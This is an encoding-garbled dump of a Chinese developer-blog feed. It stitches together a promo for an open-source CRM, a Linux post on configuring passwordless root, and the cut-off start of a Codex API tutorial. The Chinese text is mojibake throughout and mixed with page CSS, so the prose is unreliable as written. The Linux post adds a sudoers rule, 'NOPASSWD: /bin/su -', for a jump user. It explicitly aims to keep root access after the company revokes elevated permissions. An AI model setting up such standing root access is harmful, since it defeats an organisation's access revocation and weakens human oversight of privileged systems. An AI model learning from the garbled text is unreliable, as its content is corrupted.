<p>æ¥ä¸‹æ¥å°±å’Œå¤§å®¶ä¸€èµ·åˆ†äº«ä¸€ä¸‹æˆ‘åšçš„è¿™æ¬¾å…¨æ ˆCRM ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-0">âœ¨ ç‰¹æ€§</h2>
<ul>
<li>ğŸ¨Â <strong>ç°ä»£åŒ– UI</strong>Â - åŸºäº TDesign Vue Nextï¼Œæä¾›ç²¾ç¾çš„ä¼ä¸šçº§ç•Œé¢</li>
<li>ğŸ“ŠÂ <strong>æ•°æ®å¯è§†åŒ–</strong>Â - ECharts é©±åŠ¨çš„æ•°æ®å¤§å±å’Œå›¾è¡¨åˆ†æ</li>
<li>ğŸ”Â <strong>å®Œå–„çš„æƒé™ç³»ç»Ÿ</strong>Â - RBAC æƒé™æ¨¡å‹ï¼Œæ”¯æŒè§’è‰²ã€éƒ¨é—¨ã€ç”¨æˆ·ç»†ç²’åº¦æƒé™æ§åˆ¶</li>
<li>ğŸ¤–Â <strong>AI æ™ºèƒ½åŠ©æ‰‹</strong>Â - é›†æˆ AI åŠŸèƒ½ï¼Œæä¾›æ™ºèƒ½æ¨èå’Œè¾…åŠ©å†³ç­–</li>
<li>ğŸ”„Â <strong>å·¥ä½œæµå¼•æ“</strong>Â - å¯è§†åŒ–æµç¨‹è®¾è®¡å™¨ï¼Œæ”¯æŒå¤æ‚ä¸šåŠ¡æµç¨‹ç¼–æ’</li>
<li>ğŸ“Â <strong>è¡¨å•è®¾è®¡å™¨</strong>Â - æ‹–æ‹½å¼è¡¨å•è®¾è®¡ï¼Œæ”¯æŒå¤šç§å­—æ®µç±»å‹å’Œæ ¡éªŒè§„åˆ™</li>
<li>ğŸ“±Â <strong>ç§»åŠ¨ç«¯é€‚é…</strong>Â - å®Œç¾æ”¯æŒå„ç§è®¾å¤‡ï¼Œå“åº”å¼è®¾è®¡</li>
<li>ğŸ’¾Â <strong>è½»é‡åŒ–å­˜å‚¨</strong>Â - åŸºäº JSON æ–‡ä»¶å­˜å‚¨ï¼Œæ— éœ€å¤æ‚æ•°æ®åº“é…ç½®</li>
<li>ğŸš€Â <strong>å¼€ç®±å³ç”¨</strong>Â - ç®€å•é…ç½®å³å¯å¿«é€Ÿéƒ¨ç½²ä¸Šçº¿</li>
<li>ğŸ”§Â <strong>é«˜åº¦å¯å®šåˆ¶</strong>Â - æ¨¡å—åŒ–è®¾è®¡ï¼Œæ˜“äºæ‰©å±•å’ŒäºŒæ¬¡å¼€å‘</li>
</ul>
<h2 data-id="heading-1">æŠ€æœ¯æ ˆ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a86581cd4f3340668124f1aa0c23a391~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=RWM72H4%2BK3SSOVnHrBR1JB6w2po%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å‰ç«¯æŠ€æœ¯</h3>























































<table><thead><tr><th>æŠ€æœ¯</th><th>ç‰ˆæœ¬</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Vue 3</td><td>3.5.13</td><td>æ¸è¿›å¼ JavaScript æ¡†æ¶</td></tr><tr><td>TypeScript</td><td>5.7.3</td><td>JavaScript çš„è¶…é›†ï¼Œæä¾›ç±»å‹å®‰å…¨</td></tr><tr><td>Vite</td><td>6.0.5</td><td>ä¸‹ä¸€ä»£å‰ç«¯æ„å»ºå·¥å…·</td></tr><tr><td>TDesign Vue Next</td><td>1.10.6</td><td>è…¾è®¯ä¼ä¸šçº§ç»„ä»¶åº“</td></tr><tr><td>Pinia</td><td>2.3.0</td><td>Vue å®˜æ–¹çŠ¶æ€ç®¡ç†åº“</td></tr><tr><td>Vue Router</td><td>4.5.0</td><td>Vue å®˜æ–¹è·¯ç”±ç®¡ç†å™¨</td></tr><tr><td>ECharts</td><td>6.0.0</td><td>å¼ºå¤§çš„æ•°æ®å¯è§†åŒ–åº“</td></tr><tr><td>Vue Flow</td><td>1.47.0</td><td>æµç¨‹å›¾ç¼–è¾‘å™¨</td></tr><tr><td>Axios</td><td>1.7.9</td><td>HTTP å®¢æˆ·ç«¯</td></tr></tbody></table>
<h3 data-id="heading-3">åç«¯æŠ€æœ¯</h3>








































<table><thead><tr><th>æŠ€æœ¯</th><th>ç‰ˆæœ¬</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NestJS</td><td>11.0.1</td><td>æ¸è¿›å¼ Node.js æ¡†æ¶</td></tr><tr><td>TypeScript</td><td>5.7.3</td><td>ç±»å‹å®‰å…¨çš„å¼€å‘ä½“éªŒ</td></tr><tr><td>Passport JWT</td><td>4.0.1</td><td>JWT èº«ä»½éªŒè¯ç­–ç•¥</td></tr><tr><td>Bcrypt</td><td>5.1.1</td><td>å¯†ç åŠ å¯†åº“</td></tr><tr><td>Multer</td><td>2.0.2</td><td>æ–‡ä»¶ä¸Šä¼ ä¸­é—´ä»¶</td></tr><tr><td>Class Validator</td><td>0.14.2</td><td>åŸºäºè£…é¥°å™¨çš„å‚æ•°éªŒè¯</td></tr></tbody></table>
<h3 data-id="heading-4">å·²å®ç°åŠŸèƒ½</h3>
<ul>
<li><strong>ç”¨æˆ·è®¤è¯</strong></li>
<li>
<ul>
<li>ç”¨æˆ·æ³¨å†Œä¸ç™»å½•</li>
<li>JWT token è®¤è¯</li>
<li>è§’è‰²æƒé™æ§åˆ¶ï¼ˆç®¡ç†å‘˜/é”€å”®ï¼‰</li>
</ul>
</li>
<li><strong>å®¢æˆ·ç®¡ç†</strong></li>
<li>
<ul>
<li>å®¢æˆ·åˆ—è¡¨æŸ¥çœ‹ä¸æœç´¢</li>
<li>æ–°å»ºã€ç¼–è¾‘ã€åˆ é™¤å®¢æˆ·</li>
<li>å®¢æˆ·è¯¦æƒ…æŸ¥çœ‹</li>
<li>æ ‡ç­¾ç®¡ç†</li>
</ul>
</li>
<li><strong>çº¿ç´¢ç®¡ç†</strong></li>
<li>
<ul>
<li>çº¿ç´¢çŠ¶æ€æµè½¬ï¼ˆæœªè·Ÿè¿›â†’è·Ÿè¿›ä¸­â†’å·²åˆæ ¼â†’å·²æˆäº¤/æ— æ•ˆï¼‰</li>
<li>æ„å‘ç­‰çº§ç®¡ç†</li>
<li>çº¿ç´¢ç­›é€‰</li>
</ul>
</li>
<li><strong>è·Ÿè¿›è®°å½•</strong></li>
<li>
<ul>
<li>å¤šç§è·Ÿè¿›æ–¹å¼ï¼ˆç”µè¯ã€é‚®ä»¶ã€ä¼šè®®ç­‰ï¼‰</li>
<li>æ—¶é—´çº¿å±•ç¤º</li>
<li>ä¸‹æ¬¡è·Ÿè¿›æé†’</li>
</ul>
</li>
<li><strong>ä»»åŠ¡ç®¡ç†</strong></li>
<li>
<ul>
<li>å¾…åŠäº‹é¡¹ç®¡ç†</li>
<li>ä¼˜å…ˆçº§è®¾ç½®</li>
<li>åˆ°æœŸæé†’</li>
<li>ä»»åŠ¡çŠ¶æ€åˆ‡æ¢</li>
</ul>
</li>
<li><strong>æ–‡ä»¶ä¸Šä¼ </strong></li>
<li>
<ul>
<li>æ”¯æŒå›¾ç‰‡ã€PDFã€Wordã€Excel æ–‡ä»¶ä¸Šä¼ </li>
<li>å®¢æˆ·é™„ä»¶ç®¡ç†</li>
<li>æ–‡ä»¶åœ¨çº¿é¢„è§ˆå’Œä¸‹è½½</li>
</ul>
</li>
<li><strong>æ•°æ®å¤§å±</strong></li>
<li>
<ul>
<li>å®æ—¶ç»Ÿè®¡æ•°æ®å±•ç¤º</li>
<li>Echarts å›¾è¡¨å¯è§†åŒ–</li>
<li>å¤šç»´åº¦æ•°æ®åˆ†æ</li>
</ul>
</li>
<li><strong>å…¶ä»–åŠŸèƒ½</strong></li>
<li>
<ul>
<li>åˆ†é¡µæ”¯æŒï¼ˆæ‰€æœ‰åˆ—è¡¨ï¼‰</li>
<li>Mock æ•°æ®ç”Ÿæˆ</li>
<li>æ•°æ®æœç´¢å’Œç­›é€‰</li>
</ul>
</li>
</ul>
<p>å½“ç„¶å¯¹äºä¼ä¸šå›¢é˜Ÿæ¥è¯´ï¼Œç»„ç»‡éƒ¨é—¨ç®¡ç†ä¹Ÿæ˜¯å¿…å¤‡çš„ï¼ŒNO-CRMä¹Ÿå®ç°äº†åŠ¨æ€åˆ›å»ºç»„ç»‡éƒ¨é—¨çš„åŠŸèƒ½ï¼Œå¹¶èƒ½åŸºäºç»„ç»‡éƒ¨é—¨è®¾ç½®å•ç‹¬çš„æƒé™ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b9563bcc2b400cb2c55ba0fbdcb9a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=T5Hes91h2%2FVFg9IZgyVfodu9Y5s%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å½“ç„¶è¿˜æœ‰å¾ˆå¤šé«˜ä»·å€¼çš„åŠŸèƒ½ï¼Œå¤§å®¶å¯ä»¥çº¿ä¸Šä½“éªŒï¼š</p>
<ul>
<li>æ¼”ç¤ºåœ°å€ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fno-crm.flowmix.cn" target="_blank" title="http://no-crm.flowmix.cn" ref="nofollow noopener noreferrer">no-crm.flowmix.cn</a></li>
<li>å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/Nâ€¦</a></li>
</ul>
<p>å¥½å•¦ï¼Œä»Šå¤©çš„åˆ†äº«å°±åˆ°è¿™ï¼Œå¦‚æœä½ æœ‰å¥½çš„å»ºè®®ï¼Œæ¬¢è¿ç•™è¨€åŒºäº¤æµåé¦ˆï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœºå™¨é…ç½®å…å¯†åˆ‡root]]></title>    <link>https://juejin.cn/post/7577201863751106600</link>    <guid>https://juejin.cn/post/7577201863751106600</guid>    <pubDate>2025-11-27T06:57:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577201863751106600" data-draft-id="7577201863725400064" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœºå™¨é…ç½®å…å¯†åˆ‡root"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2025-11-27T06:57:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·47602202278"/> <meta itemprop="url" content="https://juejin.cn/user/977882868360796"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœºå™¨é…ç½®å…å¯†åˆ‡root
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/977882868360796/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·47602202278
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:57:34.000Z" title="Thu Nov 27 2025 06:57:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
<p>å…¬å¸ç”³è¯·æœºå™¨ç™»é™†æƒé™ï¼Œåªæœ‰workeræƒé™èƒ½é•¿æœŸä¿ç•™ï¼Œsuperæƒé™ä¼šä¸€ä¸ªæœˆåæ”¶å›ï¼Œå› æ­¤å¯¹äºä¸€äº›æœåŠ¡çš„è¿ç»´ä¸é—®é¢˜æ’æŸ¥è€Œè¨€ï¼Œä»…ä»…åªæœ‰workeræƒé™ï¼Œæ— æ³•åˆ‡åˆ°rootç”¨æˆ·ä¸‹æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œä¼šéå¸¸ä¸æ–¹ä¾¿ã€‚å¦‚æœç›´æ¥é…ç½®å…å¯†åˆ‡æ¢rootï¼Œé‚£æ‰€æœ‰ç”³è¯·äº†ç™»é™†æƒé™çš„äººéƒ½å¯ä»¥ç›´æ¥åˆ‡åˆ°rootï¼Œä¸é€šè§’è‰²æƒé™çš„åŒºåˆ†å°±å½¢åŒè™šè®¾äº†ï¼Œå› æ­¤è®¾è®¡äº†ä¸€ä¸ªå…¼é¡¾å®‰å…¨æ€§çš„å…å¯†åˆ‡æ¢rootçš„æ–¹æ¡ˆï¼Œä»¥ä¿è¯è´Ÿè´£è¯¥æœºå™¨æœåŠ¡çš„ç®¡ç†äººå‘˜åœ¨ super æƒé™è¢«å›æ”¶çš„æƒ…å†µä¸‹ï¼Œä»å…·å¤‡ç´§æ€¥è¿›å…¥ root çš„èƒ½åŠ›ï¼Œä»è€Œåœ¨æœåŠ¡å‡ºç°æ•…éšœæ—¶èƒ½å¤Ÿç¬¬ä¸€æ—¶é—´æ’æŸ¥å’Œä¿®å¤ï¼Œé¿å…å½±å“ä¸šåŠ¡è¿è¡Œã€‚</p>
<h2 data-id="heading-1">äºŒã€æ–¹æ¡ˆè®¾è®¡</h2>
<ol>
<li>
<p><strong>æ–°å»ºè·³æ¿ç”¨æˆ·</strong></p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªä¸“å±ç”¨æˆ·ï¼ˆå¦‚Â <code>rootjump</code>ï¼‰ï¼Œè¯¥ç”¨æˆ·ç”¨äºä½œä¸ºè¿›å…¥ root çš„è·³æ¿ã€‚</li>
<li>åˆ‡æ¢åˆ°æ­¤ç”¨æˆ·éœ€è¦è¾“å…¥å¯†ç ï¼Œä¸”å¯†ç ä»…æŒæœ‰è€…æœ¬äººçŸ¥æ™“ã€‚</li>
</ul>
</li>
<li>
<p><strong>é…ç½®å…å¯†åˆ‡ root</strong></p>
<ul>
<li>
<p>åœ¨Â <code>/etc/sudoers</code>Â æ–‡ä»¶ä¸­ä¸ºè¯¥è·³æ¿ç”¨æˆ·é…ç½®ï¼š</p>
<pre><code class="hljs language-css" lang="css">rootjump <span class="hljs-attribute">ALL</span>=(<span class="hljs-attribute">ALL</span>) NOPASSWD: /bin/su -
</code></pre>
<p>ä»…æ­¤ç”¨æˆ·å¯å…å¯†æ‰§è¡ŒÂ <code>su -</code>Â åˆ‡æ¢åˆ° rootã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>æƒé™éš”ç¦»ä¿éšœ</strong></p>
<ul>
<li>å…¶ä»–æ‹¥æœ‰ worker æƒé™çš„ä¸šåŠ¡ç”¨æˆ·æ— æ³•ç›´æ¥åˆ‡åˆ°è¯¥è·³æ¿ç”¨æˆ·ï¼ˆå› ä¸çŸ¥é“å…¶å¯†ç ï¼‰ï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•åˆ©ç”¨å…å¯†åˆ‡ root åŠŸèƒ½ã€‚</li>
<li>ä¿ç•™äº† root åŸå¯†ç ï¼Œé˜²æ­¢ç›´æ¥ root ç™»å½•ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€æ­¥éª¤</h2>
<ol>
<li><strong>æ–°å»ºè·³æ¿ç”¨æˆ·</strong></li>
</ol>
<p>å¿…é¡»åœ¨rootç”¨æˆ·ä¸‹è¿›è¡Œæ“ä½œï¼Œæˆ‘çš„ç”¨æˆ·åä¸º minioï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">sudo useradd -m minio
sudo passwd minio

<span class="hljs-bullet">-</span> <span class="hljs-code">`-m`</span>Â â†’ è‡ªåŠ¨åˆ›å»º home ç›®å½•ï¼ˆå¦‚Â <span class="hljs-code">`/home/minio`</span>ï¼‰
<span class="hljs-bullet">-</span>  ç„¶åÂ <span class="hljs-code">`passwd minio`</span>Â è®¾ç½®å¯†ç ï¼Œä¼šæç¤ºä½ è¾“å…¥ä¸¤é
</code></pre>
<p>2.  <strong>é…ç½®å…å¯†åˆ‡ root</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">åœ¨Â <span class="hljs-string">`/etc/sudoers`</span>Â æ–‡ä»¶ä¸­ä¸ºè¯¥è·³æ¿ç”¨æˆ·é…ç½®ï¼š

    vim /etc/sudoers

    è®¾ç½®
    minio <span class="hljs-variable constant_">ALL</span>=(<span class="hljs-variable constant_">ALL</span>) <span class="hljs-attr">NOPASSWD</span>: <span class="hljs-regexp">/bin/</span>su -


    ä»…æ­¤ç”¨æˆ·å¯å…å¯†æ‰§è¡ŒÂ <span class="hljs-string">`sudo su -`</span>Â åˆ‡æ¢åˆ° rootã€‚
</code></pre>
<p>3.  <strong>æ£€éªŒ</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c10ca06df8854c5694e17ca4e8996ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NDc2MDIyMDIyNzg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831454&amp;x-signature=AGadtBWuO9seyJ35ggMJjAF7wUw%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨è‡ªå®šä¹‰APIæ¥å…¥OpenAI CodeXé…ç½®æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7577049352838283279</link>    <guid>https://juejin.cn/post/7577049352838283279</guid>    <pubDate>2025-11-27T07:08:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838283279" data-draft-id="7577201863751122984" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨è‡ªå®šä¹‰APIæ¥å…¥OpenAI CodeXé…ç½®æ•™ç¨‹"/> <meta itemprop="keywords" content="OpenAI"/> <meta itemprop="datePublished" content="2025-11-27T07:08:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jim860"/> <meta itemprop="url" content="https://juejin.cn/user/1614520451597639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨è‡ªå®šä¹‰APIæ¥å…¥OpenAI CodeXé…ç½®æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1614520451597639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jim860
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:08:47.000Z" title="Thu Nov 27 2025 07:08:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol 